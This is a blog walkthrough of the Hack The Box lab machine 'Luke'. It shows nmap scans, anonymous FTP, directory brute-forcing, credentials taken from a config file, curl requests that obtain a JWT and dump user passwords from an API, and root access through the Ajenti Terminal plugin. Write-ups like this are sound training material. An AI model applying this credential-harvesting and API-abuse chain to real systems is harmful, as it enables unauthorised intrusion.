+++
author = "Nick"
categories = ["ssh", "dirb", "enumeration", "curl", "JSON", "ajani", "terminal", "plugins"]
date = 2019-09-14T13:52:03Z
description = ""
draft = false
image = "__GHOST_URL__/content/images/2019/07/infocard-1.png"
slug = "hack-the-box-luke"
summary = "Back with a quick write-up on the box Luke from HtB"
tags = ["ssh", "dirb", "enumeration", "curl", "JSON", "ajani", "terminal", "plugins"]
title = "Hack The Box - Luke"

+++


Back with a quick write up on the box Luke from HtB. Let me preface this with, for whatever reason, I had a hard time with this, until I realized I forgot part of my enumeration steps. Derp, well, off we go!

As usual we start it off with a standard nmap scan.

```
nmap -sC -sV -oA ./scan 10.10.10.137
```

We get back a fairly small listing of results.

```
Nmap scan report for 10.10.10.137
Host is up (0.055s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3+ (ext.1)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.15.29
|      Logged in as ftp
|      TYPE: ASCII
|      No session upload bandwidth limit
|      No session download bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
|_End of status
22/tcp open  ssh?

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 176.86 seconds
```

Well, lets see what port 21 has in store for us. We log in and we get a directory, as show above, called webapp. We change to the dir and see that there's one file here. We download it and cat it:

{{< figure src="__GHOST_URL__/content/images/2019/07/image-26.png" >}}

Well, interesting, we pop over to port 80 on the box and we have content there. However, nmap didn't show the port available. Let's rerun our nmap with all ports.

```
nmap -p 1-65535 10.10.10.137
```

This time we see a bit of a different response. I've found that newer boxes on HTB tend to be very unstable, we'll chalk this one up to that.

{{< figure src="__GHOST_URL__/content/images/2019/07/image-28.png" >}}

So the first thing we're going to do is head over to port 8000 and see what we have. We're greeted with a Ajenti login page. Lets try the basics and see if it lets us pass, the default of root / admin for the Ajenti install. No dice. We also see port 3000 running when we browse to it we see a JSON returned with 'Auth token is not supplied'.

{{< figure src="__GHOST_URL__/content/images/2019/07/image-27.png" >}}

We see a few locations. It looks like the management is returning code 401, which means we need a password to get there. We'll also enumerate using Dirbuster, omitting directories, to see what files we come back with. Sure enough we find a config.php file. Inside we have some credentials!

{{< figure src="__GHOST_URL__/content/images/2019/07/image-31.png" >}}

So we try them against the port 8000 login, nothing. We try them against management, nothing. We try them against /login.php, nothing. Well maybe we can use them to authenticate against the API on port 3000. To do this we can use Curl.

```
curl --header "Content-Type: application/json" --request POST --data '{"password":"Zk6heYCyv6ZE9Xcg", "username":"root"}' http://10.10.10.137:3000/login
```
or
```
curl -H "Content-Type: application/json" -X POST -d'{"password":"Zk6heYCyv6ZE9Xcg", "username":"root"}' http://10.10.10.137:3000/login
```

Damn, that didn't work. However, our research on port 3000 shows that root isn't an acceptable (unless created otherwise) account. Admin is the account it normally uses. So in the above, we replace root with admin and we get a token back.

```
{"success":true,
"message":"Authentication successful!",
"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYzMzY3MjE5LCJleHAiOjE1NjM0NTM2MTl9.Jp9s0VKON-ZMEh_LLv8rOoV3ARET09MzMm1CLm0Lo4Q"}
```

Now we can use that token to authenticate and use other API endpoints. To test this we issue another curl to the root of the 3000 port and see what is returned, with some luck it will be an authentication acknowledgement.

```
curl -X GET 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYzMzY2Njk1LCJleHAiOjE1NjM0NTMwOTV9.zpdpGBmtcLxmP7tHjlrrTblztksZGQkuxV7wWlJgllw' http://10.10.10.137:3000
```
and we get back 
```
{"message":"Welcome admin ! "}
```

Awesome, now lets use this to enumerate! We our dirb shows that we have a /users enpoint, lets pull that data. We get an output of 4 users.

```
[{"ID":"1","name":"Admin","Role":"Superuser"},
{"ID":"2","name":"Derry","Role":"Web Admin"},
{"ID":"3","name":"Yuri","Role":"Beta Tester"},{"ID":"4","name":"Dory","Role":"Supporter"}]
```

In this case we will pull each user name to see what data is held.

```
curl -X GET -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYzMzY2Njk1LCJleHAiOjE1NjM0NTMwOTV9.zpdpGBmtcLxmP7tHjlrrTblztksZGQkuxV7wWlJgllw' http://10.10.10.137:3000/users/USERNAMEHERE

```

Sure enough data is held inside, as we expected.

```
{"name":"Admin","password":"WX5b7)>/rp$U)FW"}
{"name":"Derry","password":"rZ86wwLvx7jUxtch"}
{"name":"Yuri","password":"bet@tester87"}
{"name":"Dory","password":"5y:!xa=ybfe)/QD"}
```

Now that we have some passwords and usernames, we should try them against the many login pages we had before. None work on port 8000, lets head back to the /login.php on port 80. None of those worked there, lets try the /management. Looks like the credentials for Derry worked.

{{< figure src="__GHOST_URL__/content/images/2019/07/image-33.png" >}}

We already know that what the login.php and config.php. Lets take a look at the config.json. When we load it we seem to have the Ajani config file which contains some goodies. The first thing we see is that Terminal plug is running a shell root. So we can probably use that to gain our flags. We also have the root username and password. This should be smooth sailing from here!

We load up port 8000 and log in with the credentials we've found. Once logged in we scope out the install and see what this is all about. At the bottom of the navigation pane we have the option for Terminal.

{{< figure src="__GHOST_URL__/content/images/2019/07/image-34.png" >}}

Looks like we should take it for a spin. Once it's loaded head over to root and snag the flag.

{{< figure src="__GHOST_URL__/content/images/2019/07/image-35.png" >}}

After that we head to /root/usr/home/derry to snag his user.txt.

{{< figure src="__GHOST_URL__/content/images/2019/07/image-36.png" >}}

We are done! A quick and easy box. The hardest part for some might be learning how to use curl against the API. See you next time!

Hopefully something was learned. If you found this write-up helpful, consider sending some respect my way: [Lovecore's HTB Profile](https://www.hackthebox.eu/home/users/profile/95635).

